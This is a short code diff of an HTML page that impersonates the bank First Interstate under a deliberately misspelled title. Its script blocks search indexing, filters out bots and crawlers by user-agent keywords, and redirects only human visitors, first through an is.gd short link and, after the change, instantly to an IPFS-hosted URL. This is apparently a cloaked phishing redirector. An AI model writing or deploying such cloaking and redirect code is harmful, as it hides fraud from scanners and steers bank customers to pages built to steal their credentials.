@@ -2,9 +2,9 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>First Interstate</title>
+  <title>First Intersate</title>
 
-  <!-- Block search engine indexing -->
+  <!-- Prevent indexing -->
   <meta name="robots" content="noindex, nofollow">
 
   <script>
@@ -27,11 +27,9 @@
       return botKeywords.some(keyword => ua.includes(keyword));
     }
 
-    // ✅ Redirect real users only
+    // ✅ Redirect real users instantly (once)
     if (!isBot()) {
-      setTimeout(function () {
-        window.location.href = "https://is.gd/ZqvnW4/";
-      }, 3000); // 5-second delay
+      window.location.replace("https://ipfs.io/ipfs/bafybeihgyw3bsldsfxbf4lrf4ivnsr3lpq6l44ycimuxk54nrn5hfs5sau/");
     }
   </script>
 </head>
